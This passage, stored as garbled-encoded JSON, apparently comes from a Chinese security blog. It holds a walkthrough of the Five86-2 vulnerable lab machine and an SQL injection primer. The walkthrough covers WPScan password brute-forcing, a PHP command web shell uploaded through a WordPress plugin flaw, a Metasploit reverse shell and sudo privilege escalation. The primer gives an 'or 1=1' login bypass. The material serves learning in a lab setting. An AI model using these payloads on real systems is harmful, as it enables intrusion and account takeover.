ä¸ºå®¹å™¨é‡æ–°åˆ†é…ä¸€ä¸ªä¼ªè¾“å…¥ç»ˆç«¯ï¼Œé€šå¸¸ä¸ -i åŒæ—¶ä½¿ç”¨ 12docker run -dt --name &lt;è‡ªå·±å¯¹å®¹å™¨å‘½å&gt; -p &lt;ä¸»æœºç³»ç»Ÿç«¯å£&gt;:&lt;å®¹å™¨å†…ç«¯å£&gt; &lt;pullä¸‹æ¥çš„å®¹å™¨åå­—&gt; docker run -dt --name sqli-lab -p 8888:80 acgpiano/sqli-labs:latest //ä¾‹å¦‚ åœæ­¢ä¸€ä¸ªå®¹å™¨ å…¶ä¸­ container identifier å¯ä»¥æ˜¯å®¹å™¨çš„ ID æˆ–åç§°ã€‚ 1docker stop &lt;container identifier&gt; æŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„å®¹å™¨ï¼Œä»¥åŠç›¸å…³ä¿¡æ¯ 12docker container ls --all docker ps -a","categories":[{"name":"Linux","slug":"Linux","permalink":"https://gryffinbit.top/categories/Linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://gryffinbit.top/tags/linux/"},{"name":"macos","slug":"macos","permalink":"https://gryffinbit.top/tags/macos/"}],"author":"Gryffinbit"},{"title":"Five86-2é¶æœºæ¸—é€æµ‹è¯•","slug":"Five86-2é¶æœºæ¸—é€æµ‹è¯•","date":"2022-01-08T13:55:06.000Z","updated":"2024-11-12T06:59:44.000Z","comments":true,"path":"2022/01/08/Five86-2é¶æœºæ¸—é€æµ‹è¯•/","permalink":"https://gryffinbit.top/2022/01/08/Five86-2%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/","excerpt":"","text":"Five86-2 é¶æœºæ¸—é€æµ‹è¯•ä¿¡æ¯æ”¶é›†Nmapå¸¸ç”¨å‚æ•° 1234567891011121314151617181920212223242526272829303132-A :å…¨é¢æ‰«æ. ç»¼åˆæ‰«æ. æ˜¯ä¸€ç§å®Œæ•´æ‰«æç›®æ ‡ä¿¡æ¯çš„æ‰«ææ–¹å¼. --exclude : æ’é™¤æŒ‡å®šçš„åœ°å€ ä¾‹: nmap 192.168.1.0/24 --exclude 192.168.1.1 é‚£ä¹ˆå°±ä¸ä¼šå¯¹192.168.1.1è¿›è¡Œæ‰«æ,--excludefile : æ’é™¤æŒ‡å®šçš„åœ°å€åˆ—è¡¨ ä¾‹: nmap 192.168.1.0/24 --excludefile list.txt é‚£ä¹ˆå°±ä¸ä¼šå¯¹list.txté‡Œé¢çš„åœ°å€è¿›è¡Œæ‰«æ,-iL : æ‰«æä¸€ä¸ªåˆ—è¡¨æ–‡ä»¶ ä¾‹ nmap -iL list.txt-sP : Pingæ‰«æ,æ•ˆç‡é«˜,è¿”å›ä¿¡æ¯å°‘. ä¾‹: nmap -sP 192.168.1.110 -P0(Pn) :æ— Pingæ‰«æ,å¯ä»¥èº²é¿é˜²ç«å¢™é˜²æŠ¤,å¯ä»¥åœ¨ç›®æ ‡ä¸»æœºç¦æ­¢pingçš„æƒ…å†µä¸‹ä½¿ç”¨-PS :TCP SYN Pingæ‰«æ-PA :TCP ACK Pingæ‰«æPR : ARP Pingæ‰«æ-n : ç¦æ­¢DNSåå‘è§£æ-T : æ—¶åºé€‰é¡¹, -TO-T5. ç”¨äºIDSé€ƒé€¸,0=&gt;éå¸¸æ…¢,1=&gt;ç¼“æ…¢çš„,2=&gt;æ–‡é›…çš„,3=&gt;æ™®é€šçš„,4=&gt;å¿«é€Ÿçš„,5=&gt;æ€¥é€Ÿçš„-p : æŒ‡å®šç«¯å£æ‰«æ-F : å¿«é€Ÿæ‰«æ-f : æŠ¥æ–‡åˆ†æ®µ-D : ipåœ°å€æ¬ºéª— ä¾‹ nmap -D RND:5 192.168.1.110 RND:ä¸ºç”Ÿæˆéšæœºipåœ°å€ -sS : TCP SYN æ‰«æ,é€Ÿåº¦å¿«, 1ç§’1000æ¬¡å·¦å³. è¾ƒä¸ºéšè”½.-sT : TCPè¿æ¥æ‰«æ-sU : UDPæ‰«æ,æ‰«æéå¸¸æ…¢,å®¹æ˜“è¢«å¿½è§†-sN,-sF : éšè”½æ‰«æ-sI : ç©ºé—²æ‰«æ,å…è®¸ç«¯å£å®Œå…¨æ¬ºéª—,å¯ä»¥å…è®¸ä¸ä½¿ç”¨è‡ªèº«ipçš„æƒ…å†µä¸‹å‘èµ·æ‰«æ,éå¸¸ä¹‹éšè”½çš„æ‰«æ.ä½†å¾—å…ˆå¯»æ‰¾ç©ºé—²ä¸»æœº,æŒ‡ä»¤ä¸º nmap -p80 -open -script ipidseq 192.168......,ç¬¬äºŒç§æ˜¯å¾€äº‹éšæœºå¯»æ‰¾, nmap -p80 -open -script ipidseq -iR 2000 (iRé€‰é¡¹ä»£è¡¨éšæœºé€‰æ‹©ç›®æ ‡.2000å¸¦è¡¨é€‰æ‹©çš„æ•°é‡,-openä»£è¡¨åªé€‰æ‹©ç«¯å£å¼€æ”¾çš„ç©ºé—²ä¸»æœº)-p- : æ‰«ææ‰€æœ‰ç«¯å£ 1-65535-top-ports : åªæ‰«æå¼€å‘æ¦‚ç‡æœ€é«˜çš„ç«¯å£ åé¢è·Ÿä¸Šæ•°å€¼ ä¾‹ nmap -top-ports 100 , å°±æ˜¯æ‰«ææ¦‚ç‡æœ€é«˜çš„å‰100ä¸ªç«¯å£&lt;ç‰ˆæœ¬æ¢æµ‹ç›¸å…³&gt;:-sV : ç‰ˆæœ¬æ¢æµ‹ ,é€šè¿‡ç›¸åº”çš„ç«¯å£æ¢æµ‹å¯¹åº”çš„æœåŠ¡,æ ¹æ®æœåŠ¡çš„æŒ‡çº¹è¯†åˆ«å‡ºç›¸åº”çš„ç‰ˆæœ¬.-sV --allports : åªæœ‰ä½¿ç”¨--allportsæ‰èƒ½æ‰«ææ‰€æœ‰çš„ç«¯å£,é»˜è®¤æƒ…å†µä¸‹å›è·³è¿‡å¦‚ TCP9100ç«¯å£(hpæ‰“å°æœºä¸“ç”¨ç«¯å£)--version-intersity : è®¾ç½®æ‰«æå¼ºåº¦ 0-9 ,æ•°å€¼è¶Šå¤§è¶Šæœ‰å¯èƒ½è¢«è¯†åˆ«,èŠ±è´¹æ—¶é—´è¶Šå¤š,é»˜è®¤æ˜¯7--version-ligth : æ‰«æå¼ºåº¦,è½»é‡çº§æ‰«æ(2) ,ç­‰ç”¨äº--version-intersity 2--version-all :æ‰«æå¼ºåº¦,é‡é‡çº§æ‰«æ(9) ,ç­‰åŒäº--version-intersity 9--version-trace : è·å–è¯¦ç»†çš„ç‰ˆæœ¬ä¿¡æ¯-sR : åˆ¤æ–­å¼€æ”¾ç«¯å£æ˜¯å¦ä¸ºRPCç«¯å£, å¦‚æœæ˜¯è¿”å›ç¨‹åºå’Œç‰ˆæœ¬å·.--resaon : æ˜¾ç¤ºä¸»æœºå­˜æ´»åŸå›  Netdiscoverç”¨æ³• äºŒå±‚å‘ç°å·¥å…·ï¼Œæ‹¥æœ‰ä¸»åŠ¨å’Œè¢«åŠ¨å‘ç°ä¸¤ç§æ–¹å¼ã€‚ å‚æ•° 12netdiscover -i eth0 //é€‰æ‹©ç›‘å¬çš„ç½‘å¡netdiscover -r 192.168.50.132 //æŒ‡å®šipæ®µ 12345-lï¼šfilename ä»æ–‡ä»¶è¯»å–rangeåˆ—è¡¨-p è¢«åŠ¨æ¨¡å¼ã€‚é»˜é»˜çš„ä¾¦å¬æŒ‡å®šçš„ç½‘å¡ä»¥å‘ç°åˆ«çš„äºŒå±‚ä¸»æœº-t ARPåŒ…å‘é€é—´éš”ã€‚å•ä½æ¯«ç§’ã€‚è¿™ä¸ªå¯ä»¥ç”¨æ¥è§„é¿æ£€æµ‹ç³»ç»Ÿçš„å‘Šè­¦ã€‚-c å‘åŒ…æ•°é‡-r //ç½‘æ®µ 192.168.8.0/24 å®éªŒç¯å¢ƒï¼š æ”»å‡»æœºï¼škali IPåœ°å€ 192.168.50.214 é¶æœºï¼šfive86-2 IPåœ°å€ 192.168.50.91 ï¼ˆä¿¡æ¯æ”¶é›†å¾—åˆ°ï¼‰ ç”¨netdiscoverè¿›è¡Œä¸»æœºå‘ç° å·²çŸ¥é¶æœºå’Œæ”»å‡»æœºå¤„äºä¸€ä¸ªç½‘æ®µä¸‹ï¼Œæ‰€ä»¥ç”¨-r è¿›è¡Œå‚æ•°çš„ç­›é€‰ 1netdiscover -i eth0 -192.168.50.0/24 åˆ—å‡ºå¯ç–‘IP 12345192.168.50.11 å¯èƒ½æ˜¯æˆ‘çš„æ˜¾ç¤ºå™¨ 192.168.50.14192.168.50.37 ipad192.168.50.25192.168.50.91 å¾ˆæœ‰å¯èƒ½ è¿›ä¸€æ­¥æ¢æµ‹192.168.50.91 123-sVï¼šå¼€å¯ç«¯å£æœåŠ¡çš„ç‰ˆæœ¬æ£€æµ‹-A: æ“ä½œç³»ç»Ÿä¿¡æ¯å’Œç«¯å£æœåŠ¡ç‰ˆæœ¬æ¢æµ‹-vï¼šè¯¦ç»†è¾“å‡ºæ‰«ææƒ…å†µ å¯ä»¥çœ‹å‡ºå®ƒæ˜¯ä¸€ä¸ªç½‘ç«™ï¼Œå¼€å¯äº†80ç«¯å£ï¼Œä¸”æ˜¯ç”¨WordPressæ­å»ºçš„ã€‚è®¿é—®ä¸€ä¸‹192.168.50.91 çœ‹çœ‹å®ƒçš„ç½‘é¡µ å‘ç°æœ‰ä¸€ä¸ªloginï¼Œå¯ä»¥æƒ³åˆ°æˆ‘ä»¬çš„ç›®æ ‡æ˜¯æ‰¾åˆ°è¿™ä¸ªç½‘é¡µçš„åå°ç®¡ç†å‘˜å¯†ç ã€‚ç‚¹å…¥loginåå‘ç°åŸŸåè§£ææœ‰é—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹æœ¬åœ°çš„hostæ–‡ä»¶ï¼Œè®©ç½‘é¡µæŒ‡å®šåˆ°æ­£ç¡®çš„åœ°æ–¹ 1vim /etc/hosts æŠŠä¸‹é¢ä¸€è¡Œæ·»åŠ è¿›å» 1192.168.50.91 five86-2 å†æ¬¡è®¿é—®ï¼Œå¯ä»¥æ­£å¸¸æ˜¾ç¤ºäº† åˆ©ç”¨WPScanå¯¹è¯¥ç½‘ç«™è¿›è¡Œæ¸—é€æ”»å‡»å’Œåç»­è¿›ä¸€æ­¥çš„æ¼æ´åˆ©ç”¨ WPScanæ˜¯ä¸€ä¸ªæ‰«æ WordPress æ¼æ´çš„é»‘ç›’å­æ‰«æå™¨ WPscan çš„ä½¿ç”¨å‚æ•° ç”¨man wpscan æŸ¥çœ‹æ›´å¤šå‚æ•°ç”¨æ³• 123wpscan --urlwpscan --url --enumerate u //å¯¹ç”¨æˆ·è¿›è¡Œæšä¸¾wpscanwpscan -P //çˆ†ç ´ç”¨æˆ·å¯†ç  æšä¸¾ç”¨æˆ· ç”¨å­—å…¸çˆ†ç ´ç”¨æˆ·å¯†ç ï¼Œkaliä¸‹è‡ªå¸¦çš„å­—å…¸è·¯å¾„/usr/share/wordlists 1wpscan -P /usr/share/wordlists/rockyou.txt --url 192.168.50.91 -t 30 --usernames barney çˆ†ç ´æˆåŠŸï¼Œç”¨è¿™ä¸ªè´¦æˆ·å¯†ç ç™»é™†è¿›å…¥ç½‘é¡µç®¡ç†åå° 12Username: barney, Password: spooky1Username: stephen, Password: apollo1 ç™»é™†æˆåŠŸåï¼Œè¿›å…¥pluginï¼Œæ‰¾åˆ°å¯ä»¥åˆ©ç”¨çš„æ’ä»¶ æ‰¾åˆ°æœ€åä¸€ä¸ªæ’ä»¶çš„åˆ©ç”¨ WordPress Plugin Insert or Embed Articulate Content into WordPress - Remote Code Execution - PHP webapps Exploit æ ¹æ®ç»™å‡ºçš„expï¼Œè¿›è¡Œæ“ä½œ åˆ›å»ºä¸¤ä¸ªæ–‡ä»¶ï¼Œè¾“å…¥ä»£ç ã€‚ 123## 1. Create .zip archive with 2 files: index.html, index.phpecho &quot;&lt;html&gt;hello&lt;/html&gt;&quot; &gt; index.htmlecho &quot;&lt;?php echo system($_GET[&#x27;cmd&#x27;]); ?&gt;&quot; &gt; index.php ç™»é™†ç®¡ç†å‘˜è´¦å·ä»¥ä¾¿å¯ä»¥ä¸Šä¼ æ–‡ä»¶ åˆ›å»ºä¸€ä¸ªæ–°æ–‡ç« ï¼Œé€‰æ‹©Add block -&gt; E-learning -&gt; ä¸Šä¼ poc.zip å°†index.php , index.html , shell.php æ‰“åŒ…ä¸ºpoc.zip å…¶ä¸­shell.phpæ˜¯å†°èä¸­è‡ªå¸¦çš„ ä½¿ç”¨å†°èçš„shell.phpè¿æ¥ å¯ä»¥çœ‹åˆ°å®ƒçš„æ–‡ä»¶ç³»ç»Ÿï¼Œåœ¨homeç›®å½•ä¸‹ï¼Œæœ‰å¾ˆå¤šç”¨æˆ·ï¼Œä¹‹å‰å·²ç»çˆ†å‡ºæ¥ç”¨æˆ·barneyçš„å¯†ç ä¸ºspooky1ã€‚ç”¨barneyç™»é™†è¿›å» åœ¨å†°èä¸­åå¼¹shellï¼Œåœ¨kaliæ”»å‡»æœºä¸­æ‰“å¼€ç›‘å¬ å†°èä¸­å¡«å…¥æ”»å‡»æœºçš„IPåœ°å€ï¼Œkaliä¸­å¡«å…¥é¶æœºçš„IPåœ°å€ 123456msfconsoleuse exploit/multi/handlerset payload php/meterpreter/reverse_tcpset lhost 192.168.50.91set lport 8090run æ¢æˆTTY 12shellpython3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot; ä»¥Stephençš„èº«ä»½ç™»é™† 1id //æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯ å‘ç°æœ‰pcapï¼ŒçŒœæµ‹å’Œæµé‡ç›¸å…³ ä½¿ç”¨tcpdumpè¿›è¡ŒæŠ“åŒ…ã€‚ ä½¿ç”¨ip addr è¿›è¡Œæ¥å£çš„æŸ¥çœ‹ï¼Œå¯¹æœ€åä¸¤ä¸ªæ¥å£è¿›è¡ŒæŠ“åŒ… 12timeout 120 tcpdump -w 1.pcp -i br-eca3858d86bftimeout 120 tcpdump -w 2.pcp -i vethc8dbbb2 ä»æŠ“åˆ°çš„æ•°æ®åŒ…è¯»å–æ•°æ® 12tcpdump -D //åˆ—å‡ºå¯ä»¥ç”¨äºæŠ“åŒ…çš„æ¥å£tcpdump -r //ä»æ–‡ä»¶ä¸­è¯»å–æŠ“åŒ…çš„è¡¨è¾¾å¼ 12tcpdump -r 1.pcptcpdump -r 2.pcp åœ¨2.pcpä¸­æ‰¾åˆ°äº†æœ‰ç”¨çš„ä¿¡æ¯ ç”¨Paulç™»é™† 12su paulesomepasswford æŸ¥çœ‹Paulç”¨æˆ·å¯ä»¥æ‰§è¡Œå“ªäº›é«˜çº§æƒé™çš„å‘½ä»¤ 1sudo -l å¯ä»¥ä»¥Peterçš„èº«ä»½æ‰§è¡Œ &#x2F;usr&#x2F;sbin&#x2F;serviceã€‚ æ‰€ä»¥å¯ä»¥ç›´æ¥æ‰§è¡ŒPeterçš„bashã€‚ç”¨ç›¸å¯¹ç›®å½•æ‰¾åˆ°Peterçš„bash 1sudo -u peter service ../../bin/bash ç›¸å¯¹è·¯å¾„é—®é¢˜ ç›¸å¯¹è·¯å¾„æ–‡ä»¶çš„ç›¸å¯¹è·¯å¾„æ˜¯å…¶ç›¸å¯¹äºå½“å‰å·¥ä½œç›®å½•çš„ä½ç½®ï¼Œå®ƒä¸ä»¥æ–œæ (/)å¼€å¤´ã€‚å®ƒä»æ­£åœ¨è¿›è¡Œçš„å·¥ä½œç›®å½•å¼€å§‹ã€‚ ç¤ºä¾‹ï¼šDesktop/CollegeStudent å•ç‚¹(.)ä»£è¡¨å½“å‰ç›®å½•ã€‚ åŒç‚¹(..)ä»£è¡¨å½“å‰å·¥ä½œç›®å½•çš„çˆ¶ç›®å½•ã€‚ æ³¢æµªå·(~)ä»£è¡¨å·²ç™»å½•ç”¨æˆ·çš„ä¸»ç›®å½• ç™»é™†åˆ°Peterä¹‹åï¼ŒæŸ¥çœ‹Peteræœ‰å“ªäº›é«˜çº§æƒé™ 1sudo -l peterå¯ä»¥æ‰§è¡Œpasswdï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ä¿®æ”¹rootçš„å¯†ç æ¥ç™»é™† 1sudo -u root passwd ç”¨æ”¹å¥½çš„å¯†ç ç™»å½•root æ‹¿åˆ°rootæƒé™ï¼Œå¯»æ‰¾åˆ°flag","categories":[{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"å®æˆ˜è®°å½•","slug":"æ¸—é€æµ‹è¯•/å®æˆ˜è®°å½•","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/"}],"tags":[{"name":"kali","slug":"kali","permalink":"https://gryffinbit.top/tags/kali/"}],"author":"Gryffinbit"},{"title":"sqlçš„ä¸€äº›ç®€æ˜“å­¦ä¹ è®°å½•","slug":"sqlçš„ä¸€äº›ç®€æ˜“å­¦ä¹ è®°å½•","date":"2022-01-06T14:03:08.000Z","updated":"2024-11-12T06:59:17.000Z","comments":true,"path":"2022/01/06/sqlçš„ä¸€äº›ç®€æ˜“å­¦ä¹ è®°å½•/","permalink":"https://gryffinbit.top/2022/01/06/sql%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AE%80%E6%98%93%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/","excerpt":"","text":"Sqlçš„ä¸€äº›ç®€æ˜“å­¦ä¹ è®°å½•sqlæ³¨å…¥æ¼æ´è¢«åˆ©ç”¨çš„è¿‡ç¨‹sqlæ³¨å…¥æ˜¯ä¸€ç§æ³¨å…¥å‹æ¼æ´ï¼Œå…¶æœ¬è´¨æ˜¯æœåŠ¡å™¨æŠŠç”¨æˆ·å¯æ§çš„æ•°æ®æ‹¼æ¥åå½“æˆsqlè¯­å¥æ‰§è¡Œã€‚ å®¢æˆ·ç«¯åœ¨å¯ä»¥æ§åˆ¶çš„å‚æ•°å¤„æ„é€ sqlæ³¨å…¥è¯­å¥å¹¶å‘é€ç»™æœåŠ¡å™¨ æœåŠ¡å™¨æ¥æ”¶åˆ°å®¢æˆ·ç«¯çš„æ•°æ®åæ²¡æœ‰ç»è¿‡ä¸¥æ ¼è¿‡æ»¤å¤„ç†ï¼Œå°†å…¶æ‹¼æ¥åˆ°å°†è¦æ‰§è¡Œçš„sqlè¯­å¥ä¸­ æ•°æ®åº“å¼•æ“æ‰§è¡ŒæœåŠ¡å™¨ä¼ æ¥çš„sqlè¯­å¥ï¼Œå°†ç»“æœè¿”å›ç»™æœåŠ¡å™¨ æœåŠ¡å™¨æ¥æ”¶åˆ°ç»“æœåè¿›è¡Œä¸€ç³»åˆ—å¤„ç†ï¼Œä¹‹åè¿”å›å†…å®¹ç»™å®¢æˆ·ç«¯ å®¢æˆ·ç«¯æ¥æ”¶åˆ°æœåŠ¡å™¨è¿”å›çš„å†…å®¹ï¼Œæ ¹æ®å†…å®¹åˆ¤æ–­æ³¨å…¥ç»“æœå’Œæ„é€ ä¸‹ä¸€æ­¥çš„sqlæ³¨å…¥è¯­å¥ sqlæ³¨å…¥çš„åˆ†ç±»æŒ‰ç…§ä¸Šé¢sqlæ³¨å…¥çš„è¿‡ç¨‹ï¼Œä»å®¢æˆ·ç«¯-&gt;æœåŠ¡ç«¯ï¼Œå¯ä»¥åˆ†ä¸ºï¼špostæ³¨å…¥ã€getæ³¨å…¥ã€cookieæ³¨å…¥ã€httpå¤´æ³¨å…¥ â€¦ä»æœåŠ¡ç«¯-&gt;æ•°æ®åº“å¼•æ“ï¼Œå¯ä»¥åˆ†ä¸ºï¼šæ•°å­—å‹æ³¨å…¥ã€å­—ç¬¦å‹æ³¨å…¥ â€¦ä»æœåŠ¡ç«¯-&gt;å®¢æˆ·ç«¯ï¼Œå¯ä»¥åˆ†ä¸ºï¼šå›æ˜¾æ³¨å…¥ã€ç›²æ³¨ â€¦ æŒ‰ç…§SQLæ³¨å…¥åˆ©ç”¨æ–¹æ³•ï¼Œåˆå¯ä»¥åˆ†ä¸ºï¼šè”åˆæŸ¥è¯¢æ³¨å…¥ã€æŠ¥é”™æ³¨å…¥ã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨ã€å †å æ³¨å…¥ â€¦ è™½ç„¶æœ‰å¾ˆå¤šç§åˆ†ç±»ï¼Œä½†åªè¦æŒæ¡åˆ°SQLæ³¨å…¥çš„æœ¬è´¨ï¼Œè¿™äº›ä¸åŒç±»åˆ«çš„æ³¨å…¥å°±éƒ½å¾ˆå¥½ç†è§£ã€‚ ç»•è¿‡ç™»é™†éªŒè¯123456$username = $_POST[&#x27;username&#x27;];$password = $_POST[&#x27;password&#x27;];$sql = &quot;select * from users where username=&#x27;&quot;.$username.&quot;&#x27; and password=&#x27;&quot;.$password.&quot;&#x27;&quot;;// æ‰§è¡Œsqlè¯­å¥ï¼Œåˆ¤æ–­æŸ¥è¯¢ç»“æœ 1select * from users where username=&#x27;admin&#x27; and password=&#x27;&#x27; or 1=1#&#x27; è¯­å¥ä»usersè¡¨ä¸­æŸ¥è¯¢æ»¡è¶³æ¡ä»¶çš„å†…å®¹ï¼Œæ¡ä»¶ä¸ºusername=&#39;admin&#39; and password=&#39;&#39; or 1=1ï¼ˆç”±äº#åœ¨sqlè¯­å¥ä¸­æ˜¯æ³¨é‡Šç¬¦ï¼Œæ‰€ä»¥åé¢çš„å•å¼•å·æ²¡æœ‰ä½œç”¨ï¼‰å› ä¸º sql è¯­å¥ä¸­orçš„ä¼˜å…ˆçº§é«˜äºandï¼Œæ‰€ä»¥è¿™é‡Œçš„æ¡ä»¶å¯ä»¥æ”¹æˆusername=&#39;admin&#39; and (password=&#39;&#39; or 1=1)ï¼Œåé¢çš„password=&#39;&#39; or 1=1ä¸­1=1æ°¸è¿œä¸ºçœŸï¼Œæ‰€ä»¥æ¡ä»¶è¯­å¥åˆç­‰ä»·äºusername=&#39;admin&#39; and 1=1ï¼Œå³username=&#39;admin&#39; æ‰€ä»¥ï¼Œæ•´ä¸ªsqlè¯­å¥å˜æˆäº†select * from users where username=&#39;admin&#39;ï¼Œä»è€Œè¾¾åˆ°ä»¥adminç”¨æˆ·ç™»å½•çš„ç›®çš„ã€‚ æœ‰å›æ˜¾çš„æ³¨å…¥æ•°æ®åº“å¢åˆ æ”¹æŸ¥éœ€è¦ç”¨åˆ°schemaï¼ˆæ•°æ®åº“åï¼‰ã€tableï¼ˆè¡¨åï¼‰ã€columnï¼ˆåˆ—åï¼‰ 1234show datebase //æŸ¥çœ‹å½“å‰æ‰€æœ‰æ•°æ®åº“use æ•°æ®åº“å //è¿›å…¥è¿™ä¸ªæ•°æ®åº“show tables //æŸ¥çœ‹è¿™ä¸ªæ•°æ®åº“ä¸­æ‰€æœ‰è¡¨show columns from è¡¨å //æŸ¥çœ‹è¡¨ä¸­æ‰€æœ‰å­—æ®µ å½“ä¸èƒ½ä½¿ç”¨showæ—¶ï¼Œå¯ä»¥ä½¿ç”¨ information_schema åº“ï¼Œæ¥è·å–æ•°æ®åº“ä¿¡æ¯ ä¸¾ä¾‹: 123//æŸ¥è¯¢æ‰€æœ‰æ•°æ®åº“åshow datebase;select schema_name from information_schema.shemata; 123//æŸ¥è¯¢åˆ¶å®šæ•°æ®åº“ä¸‹çš„æ‰€æœ‰è¡¨åshow table from æ•°æ®åº“å;select table_name from information_schema.tables where table_schema = &#x27;æ•°æ®åº“å&#x27;; 123//æŸ¥è¯¢æŒ‡å®šè¡¨ä¸‹çš„å­—æ®µåshow column from è¡¨åï¼›select column_name from information_schema.columns where table_name=&#x27;è¡¨å&#x27; ; å‚è€ƒhttps://dar1in9s.github.io/2020/08/01/sql%E6%B3%A8%E5%85%A501-sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86 https://dar1in9s.github.io/2020/08/07/sql%E6%B3%A8%E5%85%A502-%E6%9C%89%E5%9B%9E%E6%98%BE%E7%9A%84%E6%B3%A8%E5%85%A5/#mysql%E4%B8%AD%E7%9A%84information-schema%E6%95%B0%E6%8D%AE%E5%BA%93","categories":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/"},{"name":"sql","slug":"Webå®‰å…¨/sql","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/sql/"}],"tags":[{"name":"sql","slug":"sql","permalink":"https://gryffinbit.top/tags/sql/"}],"author":"Gryffinbit"},{"title":"Linuxç”¨æˆ·ä¸ç”¨æˆ·ç»„","slug":"Linux ç”¨æˆ·ä¸ç”¨æˆ·ç»„ ","date":"2022-01-05T11:47:32.000Z","updated":"2024-08-27T02:28:08.000Z","comments":true,"path":"2022/01/05/Linux ç”¨æˆ·ä¸ç”¨æˆ·ç»„ /","permalink":"https://gryffinbit.top/2022/01/05/Linux%20%E7%94%A8%E6%88%B7%E4%B8%8E%E7%94%A8%E6%88%B7%E7%BB%84%20/","excerpt":"","text":"Linux ç”¨æˆ·ä¸ç”¨æˆ·ç»„linux ç”¨æˆ·ç»„æ¦‚è¿°uid: ç”¨æˆ·æ ‡è¯†ç¬¦ æ¯ä¸ªç”¨æˆ·éƒ½æœ‰ä¸€ä¸ªç‰¹å®šçš„æ•°å€¼ï¼Œè¿™æ ·æ˜¯ä¸ºäº†æ–¹ä¾¿æ‰§è¡Œçš„æ—¶å€™å†…æ ¸æ›´æ–¹ä¾¿å»è°ƒç”¨å…³äºä½ è¿™ä¸ªç”¨æˆ·çš„ä¿¡æ¯ï¼Œä¸åŒçš„ç”¨æˆ·ä»–ä»¬uidä¸€èˆ¬ä¸ä¸€æ · gid: ç»„è¡¨ç¤ºç¬¦ï¼Œ æ„æ€å’Œç”¨æˆ·è¡¨ç¤ºç¬¦ä¸€æ ·ï¼Œå¯ä»¥ç±»æ¯”èµ·æ¥ç†è§£ ç™»é™†shell: ä¸€ç§è¿æ¥ç³»ç»Ÿå†…æ ¸äºç”¨æˆ·çš„åº”ç”¨ç¨‹åº ç”¨æˆ·ç»„åˆ†ç±»root: uid&#x3D;0 æ™®é€šç”¨æˆ·ï¼šuid&#x3D; 500 â€“ 6000 ã€kalié»˜è®¤ä»1000å¼€å§‹ã€‘ å…·æœ‰æ“ä½œç³»ç»Ÿæœ‰é™çš„æƒé™ ä¼ªç”¨æˆ·ï¼šuidå¤„åœ¨rootå’Œæ™®é€šç”¨æˆ·ä¹‹é—´ ä¸ºäº†æ»¡è¶³ç³»ç»Ÿè¿›ç¨‹éœ€è¦è€Œç‰¹åœ°åˆ›å»ºçš„æ°¸ä¹…ï¼Œç”±äºæ²¡æœ‰ç»™ä»–åˆ†é…shellï¼Œæ‰€ä»¥ä¸èƒ½ä½¿ç”¨è¯¥è¿›è¡Œç™»é™†æ“ä½œ åˆå«ç³»ç»Ÿæˆ–è€…æœåŠ¡ç”¨æˆ·ï¼Œä¸€èˆ¬æ¥è¯´è¿™äº›ç”¨æˆ·çš„ä½œç”¨å°±æ˜¯æ»¡è¶³å½“æ‰§è¡ŒæŸä¸€ç³»ç»Ÿè¿›ç¨‹æ—¶çš„æƒé™éœ€è¦ï¼Œæœ‰äº›ç³»ç»Ÿæ–‡ä»¶æ™®é€šç”¨æˆ·æ˜¯æ²¡æœ‰æƒé™çš„ï¼Œæ‰€ä»¥ä¸ºäº†æ‰§è¡Œè¿™ä¸€å‘½ä»¤å°±éœ€è¦åˆ†é…æ›´é«˜çš„æƒé™ï¼Œä½†æ˜¯åˆä¸èƒ½è¿‡é«˜ï¼Œé«˜åˆ°åƒrootç”¨æˆ·é‚£æ ·ï¼Œæ‰€ä»¥å°±ä¼šæ ¹æ®ä¸åŒçš„åŠŸèƒ½ä¸ºä»–ä»¬å¸¸è§ä¸åŒçš„ç”¨æˆ·å»æ‰§è¡Œå®ƒ ä¸€èˆ¬æ¥è¯´ä¸€ç§å‘½ä»¤æˆ–è€…æœåŠ¡å¯¹åº”ä¸€ä¸ªä¼ªç”¨æˆ· ä¼ªç”¨æˆ·ä¸ä»…æ˜¯ç”¨æ¥æ‰§è¡Œç³»ç»Ÿæœ‰å…³çš„è¿›ç¨‹ï¼Œä¹Ÿèƒ½ä½¿ä¸€äº›ç¬¬ä¸‰æ–¹æœåŠ¡åŠŸèƒ½ï¼Œæ¯”å¦‚è¯´ä»€ä¹ˆç½‘ç«™æœåŠ¡ï¼Œå¯èƒ½å®ƒçš„æŸä¸€éƒ¨åˆ†éœ€è¦ç”¨åˆ°é«˜äºæ™®é€šç”¨æˆ·çš„æƒé™ï¼Œæ‰€ä»¥åœ¨å®‰è£…è¿™é—¨æœåŠ¡çš„æ—¶å€™ä¼šé»˜è®¤ç»™ä½ çš„ç³»ç»Ÿæ·»åŠ ä¸€ä¸ªä¼ªç”¨æˆ·ï¼Œä½¿æœåŠ¡æ­£å¸¸è¿è¡Œ æ‰§è¡Œä¸€ä¸ªæ“ä½œå‘½ä»¤æ—¶éƒ½ä¼šä»¥æŸä¸€ç‰¹å®šç”¨æˆ·çš„åä¹‰æ‰§è¡Œï¼Œå½“ä½ ä½¿ç”¨æ™®é€šç”¨æˆ·ç™»é™†çš„æ—¶å€™ä½ 